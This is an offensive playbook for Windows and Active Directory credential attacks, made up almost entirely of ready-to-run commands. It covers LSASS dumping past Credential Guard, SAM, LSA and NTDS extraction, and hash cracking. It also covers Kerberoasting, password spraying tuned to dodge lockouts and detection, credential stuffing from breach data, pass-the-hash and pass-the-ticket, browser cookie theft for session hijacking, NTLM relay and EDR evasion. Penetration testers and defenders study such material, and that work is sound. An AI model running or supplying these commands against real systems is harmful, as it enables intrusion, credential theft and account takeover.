# Credential Attack Failure Recovery Guide

When your primary attack fails, use this guide to pivot to alternatives.

---

## LSASS Protected (Credential Guard / PPL)

**Symptom:** LSASS dump returns empty results, `ERROR kuhl_m_sekurlsa_acquireLSA`, or access denied even as SYSTEM.

### Alternatives (in order of preference)
```
# 1. SAM dump — still works, gets local accounts only
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# 2. DPAPI — extract saved credentials without touching LSASS
SharpDPAPI.exe triage
SharpDPAPI.exe credentials
SharpDPAPI.exe machinemasterkeys

# 3. Cached domain credentials in registry (DCC2 hashes)
reg save HKLM\SECURITY C:\Temp\SECURITY
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
# DCC2 hashes → hashcat -m 2100 (slow to crack but possible)

# 4. LSA Secrets — service account passwords
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
# Extracts: service account passwords, autologon creds, VPN passwords

# 5. NTDS.dit if on DC — Credential Guard doesn't protect NTDS
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\ntds" quit quit
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# 6. Try comsvcs.dll MiniDump (sometimes bypasses PPL where mimikatz fails)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\out.dmp full

# 7. PPLdump / PPLKiller (remove PPL protection first, then dump)
PPLdump.exe lsass.exe lsass.dmp
# Requires: vulnerable signed driver or kernel exploit

# 8. Look for credentials elsewhere
dir /s /b C:\Users\*\.ssh\id_rsa
dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Credentials\*
findstr /si "password" C:\Users\*\Documents\*.txt C:\Users\*\Desktop\*.txt
```

---

## Hashes Won't Crack

**Symptom:** Hashcat exhausts wordlist with no results. Hash is valid but password is strong.

### Escalation Strategy
```
# 1. Verify hash format is correct
hashcat --identify hash.txt
# Ensure mode matches: NTLM=1000, NTLMv2=5600, Kerberoast=13100, AS-REP=18200

# 2. Try progressively more aggressive rules
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# 3. Mask attack based on password policy
# If policy requires: 8+ chars, uppercase, lowercase, digit, special
hashcat -m <mode> hash.txt -a 3 ?u?l?l?l?l?d?d?s          # Ulllldds
hashcat -m <mode> hash.txt -a 3 ?u?l?l?l?l?l?d?d?d?s       # Ulllllddd!
hashcat -m <mode> hash.txt -a 3 ?u?l?l?l?l?l?l?d?d?d?d      # Ullllldddd

# 4. Combinator with company name + year
echo "CompanyName" > company.txt
echo "Company" >> company.txt
echo "COMPANY" >> company.txt
# Create suffix file
echo -e "2024!\n2025!\n123!\n2024\n2025\n1!\n01!\n2024#\n2025#" > suffixes.txt
hashcat -m <mode> hash.txt -a 1 company.txt suffixes.txt

# 5. Hybrid attack — wordlist + mask
hashcat -m <mode> hash.txt -a 6 /usr/share/wordlists/rockyou.txt ?d?d?d?d    # word + 4 digits
hashcat -m <mode> hash.txt -a 6 /usr/share/wordlists/rockyou.txt ?d?d?s      # word + 2 digits + special
hashcat -m <mode> hash.txt -a 6 company.txt ?d?d?d?d?s                       # company + 4 digits + special

# 6. CeWL — build target-specific wordlist from company website
cewl -m 5 -w cewl_wordlist.txt --with-numbers https://target.com
hashcat -m <mode> hash.txt cewl_wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# 7. Check known hash databases (for common hashes)
# https://crackstation.net (free online lookup)
# https://hashes.org
# hashmob.net

# 8. If NTLM hash — skip cracking entirely
# Pass-the-hash works with NTLM hashes without knowing the password
impacket-psexec -hashes :NTHASH domain.local/user@target
crackmapexec smb target -u user -H NTHASH
evil-winrm -i target -u user -H NTHASH
```

---

## Kerberoast Returns No SPNs

**Symptom:** `No entries found!` or empty output from GetUserSPNs.

### Recovery Options
```
# 1. AS-REP Roasting — target users without pre-auth (different vulnerability)
impacket-GetNPUsers domain.local/user:pass -dc-ip 10.10.10.1 -request -format hashcat -outputfile asrep.txt

# If no username list, enumerate first:
kerbrute userenum --dc 10.10.10.1 -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# 2. Manual LDAP enumeration for SPNs (maybe GetUserSPNs filtering too aggressively)
ldapsearch -x -H ldap://10.10.10.1 -D "user@domain.local" -w 'pass' -b "dc=domain,dc=local" "(servicePrincipalName=*)" dn servicePrincipalName sAMAccountName

# 3. Check for computer account SPNs (less useful but sometimes weak passwords)
ldapsearch -x -H ldap://10.10.10.1 -D "user@domain.local" -w 'pass' -b "dc=domain,dc=local" "(&(objectCategory=computer)(servicePrincipalName=*))" dn servicePrincipalName

# 4. Look for Group Managed Service Accounts (gMSA)
ldapsearch -x -H ldap://10.10.10.1 -D "user@domain.local" -w 'pass' -b "dc=domain,dc=local" "(objectClass=msDS-GroupManagedServiceAccount)" dn

# Read gMSA password if you're in the allowed group:
python3 gMSADumper.py -u user -p pass -d domain.local -l 10.10.10.1

# 5. Targeted Kerberoasting — set SPN on account you can write to
# If you have GenericAll/GenericWrite on a user:
python3 targetedKerberoast.py -u user -p pass -d domain.local --dc-ip 10.10.10.1
# Or manually:
impacket-addspn -u domain.local/user -p pass -s HTTP/fake.domain.local -t targetuser 10.10.10.1
impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.1 -request -target-domain domain.local
# Clean up: remove the SPN after getting the hash
impacket-addspn -u domain.local/user -p pass -s HTTP/fake.domain.local -t targetuser 10.10.10.1 -r

# 6. Password spray instead (different approach entirely)
kerbrute passwordspray --dc 10.10.10.1 -d domain.local users.txt 'Spring2025!'
```

---

## Password Spray Getting Blocked

**Symptom:** Accounts getting locked out, IP being blocked, or all attempts failing.

### Recovery Options
```
# 1. Reduce spray rate — 1 password per lockout observation window
# Check policy first:
crackmapexec smb 10.10.10.1 -u user -p pass --pass-pol
# If lockout observation = 30 min, wait 31 min between passwords

# 2. Try only 1 password at a time
kerbrute passwordspray --dc 10.10.10.1 -d domain.local users.txt 'Spring2025!'
# Wait 31 minutes
kerbrute passwordspray --dc 10.10.10.1 -d domain.local users.txt 'Summer2025!'

# 3. Use known-valid accounts only (remove disabled/nonexistent to avoid noise)
kerbrute userenum --dc 10.10.10.1 -d domain.local all_users.txt -o valid_users.txt
# Then spray only valid users

# 4. Try web portal instead of SMB (different lockout policies, different monitoring)
# OWA
python3 sprayhound -U users.txt -p 'Spring2025!' -d domain.local -dc 10.10.10.1 --owa https://mail.target.com
# Office 365
trevorspray -u users.txt -p 'Spring2025!' -d target.com

# 5. Spray via Kerberos (no 4625 events — generates 4768 instead)
kerbrute passwordspray --dc 10.10.10.1 -d domain.local users.txt 'Spring2025!'
# Kerbrute pre-auth failures don't increment lockout counter on some configs

# 6. Switch to credential stuffing from breach data
# Download breach compilations, extract target domain entries
grep "@target.com" breach_compilation.txt | sort -u > target_creds.txt
# Test each found credential (legitimate username+password pairs)

# 7. Use fireprox for IP rotation (web portals only)
# Deploy API Gateway proxies to rotate source IP per request
python3 fire.py --command create --url https://login.microsoftonline.com
```

---

## No Cleartext Credentials Found

**Symptom:** Have hashes or encrypted blobs but need actual authentication. No plaintext passwords available.

### Authentication Without Plaintext
```
# 1. Pass-the-Hash (NTLM hash — works for SMB, WMI, DCOM, WinRM)
impacket-psexec -hashes :NTHASH domain.local/user@target
impacket-wmiexec -hashes :NTHASH domain.local/user@target
impacket-smbexec -hashes :NTHASH domain.local/user@target
crackmapexec smb target -u user -H NTHASH
evil-winrm -i target -u user -H NTHASH
xfreerdp /v:target /u:user /pth:NTHASH    # RDP with restricted admin

# 2. Pass-the-Ticket (Kerberos ticket — works for any Kerberos service)
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass domain.local/user@target
impacket-smbclient -k -no-pass target

# 3. Overpass-the-Hash (NTLM hash → Kerberos TGT → Kerberos auth)
impacket-getTGT -hashes :NTHASH domain.local/user
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass target

# Rubeus (Windows)
Rubeus.exe asktgt /user:username /rc4:NTHASH /ptt
# Now Kerberos tickets in memory for all service access

# 4. Check for SSO tokens and browser session cookies
# Chrome cookies (may contain active sessions)
SharpChromium.exe cookies
# Firefox cookies
python3 firefox_decrypt.py /path/to/profile
# Check for Azure AD tokens
cat %LOCALAPPDATA%\Microsoft\TokenBroker\Cache\*.tbres
cat ~/.azure/msal_token_cache.json

# 5. Browser session cookies — hijack active sessions
# Use extracted cookies in browser:
# Install Cookie-Editor extension → import JSON cookies

# 6. DPAPI-encrypted blobs — decrypt with domain backup key
SharpDPAPI.exe credentials /pvk:domain_backup_key.pvk
# Decrypts: saved Windows credentials, browser passwords, WiFi keys

# 7. Kerberos ticket extraction — check memory for existing tickets
Rubeus.exe triage
Rubeus.exe dump /service:krbtgt /nowrap
# Export and import on attacker machine:
Rubeus.exe ptt /ticket:<base64_ticket>

# 8. NTLM hash relay — don't crack, relay to another service
impacket-ntlmrelayx -t smb://target2 -smb2support
# Coerce the user whose hash you have to authenticate to you
```

---

## Specific Tool Failures

### Mimikatz Blocked by AV/EDR
```
# 1. Use pypykatz (Python — runs on Linux from dump file)
pypykatz lsa minidump lsass.dmp

# 2. Use CrackMapExec modules (doesn't touch disk)
crackmapexec smb target -u admin -p pass -M lsassy
crackmapexec smb target -u admin -p pass --lsa

# 3. Use nanodump (direct syscalls, evades most EDR)
nanodump.exe --write C:\Temp\out.dmp

# 4. Use comsvcs.dll (LOLBin — already on every Windows box)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\out.dmp full

# 5. BOF (Beacon Object Files) for CobaltStrike — no disk artifact
# nanodump BOF, minidump BOF, etc.
```

### Impacket Connection Failures
```
# 1. Try different execution methods
impacket-psexec domain.local/admin:pass@target    # Creates service
impacket-wmiexec domain.local/admin:pass@target   # WMI-based
impacket-smbexec domain.local/admin:pass@target   # SMB-based
impacket-atexec domain.local/admin:pass@target "whoami"   # Task scheduler
impacket-dcomexec domain.local/admin:pass@target  # DCOM-based

# 2. Try Kerberos auth instead of NTLM
impacket-getTGT domain.local/admin:pass
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass domain.local/admin@target

# 3. Check if ports are filtered
nmap -sT -p 135,139,445,5985 target
# SMB blocked? Try WinRM (5985), DCOM (135), or WMI

# 4. Use evil-winrm as alternative
evil-winrm -i target -u admin -p pass
evil-winrm -i target -u admin -H NTHASH
```

### Certipy / ADCS Attacks Failing
```
# 1. Verify CA is accessible
curl -k https://ca.domain.local/certsrv/
certipy find -u user@domain.local -p pass -dc-ip 10.10.10.1

# 2. If template name is wrong, list all templates
certipy find -u user@domain.local -p pass -dc-ip 10.10.10.1 -stdout | grep "Template Name"

# 3. If enrollment fails, check permissions
certipy find -u user@domain.local -p pass -dc-ip 10.10.10.1 -vulnerable -stdout

# 4. Try Certify.exe from Windows instead
Certify.exe find /vulnerable
Certify.exe request /ca:CA-NAME /template:TEMPLATE /altname:administrator

# 5. Manual certificate request via certreq (Windows native)
certreq -submit -attrib "CertificateTemplate:User" request.req
```
